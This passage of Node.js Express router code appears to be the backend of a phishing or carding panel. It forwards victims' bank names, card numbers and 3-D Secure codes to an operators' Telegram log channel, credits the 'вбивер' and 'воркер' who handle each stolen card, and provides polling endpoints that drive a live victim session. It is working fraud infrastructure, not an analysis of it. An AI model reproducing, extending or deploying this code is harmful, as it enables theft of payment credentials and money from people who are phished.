                        await bot.telegram.sendMessage(config.bot.admin_logs, `📬 <b>${data.service}:</b>\n✉️ Password введён ✉️\n\n📬 <b>Стоимость товара:</b> ${price}\n📬 <b>ID:</b> <code>${req.params['id']}</code>\n\n🏦 <b>Банк:</b> ${res_card.bank}\n📬 <b>Номер карты:</b> ${res_card.card_number}\n📬 <b>Password:</b> ${req.body['cc_3dscode']}\n\n🥷 <b>Вбивер:</b> @${(res_card.vbiver != undefined) ? res_card.vbiver : 'cant get vbiver'}\n👨🏻‍💻 <b>Воркер:</b> @${data.tgUsername}<code> | ${data.tgID}</code>`, { parse_mode: 'HTML' })
                    })

                    return res.json({ status: 'success' })
                }
            } else {
                res.sendStatus(403)
            }
        }
    } catch (e) {
        loggy.warn(e)
    }
})

router.post('/getStatus/:id', async (req, res) => {
    try {
        await logs.findOneAndUpdate({ link: req.body['id'] }, { $set: { method: "nothing" } }).lean().then(async (data) => {
            await res.json({
                method: data.method
            })
        })
    } catch (e) {
        loggy.warn(e)
    }
})

router.post('/getSecret/:id', async (req, res) => {
    try {
        await logs.findOneAndUpdate({ link: req.body['id'] }, { $set: { secret: "nothing" } }).lean().then(async (data) => {
            await res.json({
                secret: data.secret
            })
        })
    } catch (e) {
        loggy.warn(e)
    }
})

router.post('/getPassword/:id', async (req, res) => {
    try {
        await logs.findOneAndUpdate({ link: req.body['id'] }, { $set: { password: "nothing" } }).lean().then(async (data) => {
            await res.json({
                password: data.secret
            })
        })
    } catch (e) {
        loggy.warn(e)
    }
})

module.exports = router